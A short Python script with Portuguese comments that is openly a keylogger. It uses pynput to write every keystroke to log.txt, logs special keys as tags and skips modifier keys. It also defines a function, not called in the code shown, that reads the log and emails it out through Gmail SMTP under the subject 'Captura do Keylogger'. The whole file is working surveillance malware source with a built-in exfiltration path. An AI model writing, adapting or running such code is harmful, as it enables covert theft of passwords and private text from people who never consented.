import smtplib
from pynput import keyboard

EMAIL = "seu_email@gmail.com"
E_SENHA = "xxxx xxxx xxxx xxxx" # Senha de App

def enviar_email():
    print("Preparando para enviar...")
    
    with open("log.txt", "r", encoding="utf-8") as arquivo:
        conteudo = arquivo.read()

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL, E_SENHA)

    mensagem = f"Subject: Captura do Keylogger\n\n{conteudo}"
    
    server.sendmail(EMAIL, EMAIL, mensagem.encode("utf-8"))
    server.quit()
    print("E-mail enviado!")

IGNORAR = {
    keyboard.Key.shift_r,
    keyboard.Key.shift_l,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_gr,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

def on_press(key):
    try:
        # Tecla normal (letra, número, símbolo)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" [DEL] ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()